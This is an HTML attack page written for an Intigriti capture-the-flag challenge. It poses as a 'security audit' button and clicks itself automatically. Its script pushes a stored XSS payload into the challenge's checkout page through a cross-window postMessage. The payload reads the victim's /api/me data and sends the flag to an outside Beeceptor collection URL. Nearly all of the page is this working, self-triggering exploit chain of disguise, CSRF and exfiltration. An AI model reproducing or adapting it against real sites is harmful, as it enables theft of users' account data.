<!DOCTYPE html>
<html>
<head>
    <title>Audit Initializing</title>
    <style>
        body { background: #050A0E; color: #00FF88; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #btn { padding: 20px; border: 2px solid #00FF88; background: transparent; color: #00FF88; font-weight: bold; cursor: pointer; width: 100%; height: 100%; font-size: 2em; }
    </style>
</head>
<body>
    <!-- Intigriti bots are designed to click a button if they see one -->
    <button id="btn">CLICK TO START SECURITY AUDIT</button>

    <script>
        const challenge = "https://challenge-0126.intigriti.io";
        // REPLACE WITH YOUR BEECEPTOR URL
        const beeceptor = "https://kavil.free.beeceptor.com";
        
        // THE PAYLOAD: Breaks out of title attribute and steals flag
        const xss = `"><img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${beeceptor}/flag?v='+btoa(d.flag)))">`;

        document.getElementById('btn').onclick = () => {
            // 1. Open checkout page
            const win = window.open(`${challenge}/checkout.html?currency=1337COIN&price=1`, '_blank');

            // 2. Wait for the page to initialize
            setTimeout(() => {
                // 3. CSRF: Force the checkout page to submit our malicious address
                win.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: xss,
                        currency: '1337COIN',
                        amount: 0.000001
                    }
                }, '*');

                // 4. Redirect the popup to MarketWatch to trigger the stored XSS
                setTimeout(() => {
                    win.location.href = `${challenge}/marketwatch.html`;
                }, 2000);
            }, 2000);
        };

        // Automatic trigger for bots that don't click
        setTimeout(() => { document.getElementById('btn').click(); }, 500);
    </script>
</body>
</html>
